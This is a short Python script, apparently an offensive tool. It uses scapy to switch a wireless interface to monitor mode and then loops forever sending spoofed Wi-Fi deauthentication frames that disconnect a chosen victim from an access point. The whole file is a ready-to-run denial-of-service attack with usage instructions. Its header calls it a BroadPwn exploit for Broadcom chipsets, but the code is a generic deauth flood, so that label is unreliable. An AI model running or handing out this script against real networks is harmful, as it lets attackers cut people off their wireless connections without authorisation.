#!/usr/bin/env python3
# BroadPwn DoS single victim script for Broadcom BCM43xx Wi-Fi chipsets

from scapy.all import *
import sys
import os

def dos_single(target_mac, ap_mac, iface):
    pkt = RadioTap() / \
          Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / \
          Dot11Deauth(reason=7)
    print(f"[+] Sending DeAuth frames to {target_mac} via AP {ap_mac} on {iface}")
    while True:
        sendp(pkt, iface=iface, count=1, inter=0.1, verbose=0)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 bcmdos.py <target-mac> <ap-mac> <interface>")
        sys.exit(1)

    target = sys.argv[1]
    ap = sys.argv[2]
    interface = sys.argv[3]

    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")

    dos_single(target, ap, interface)
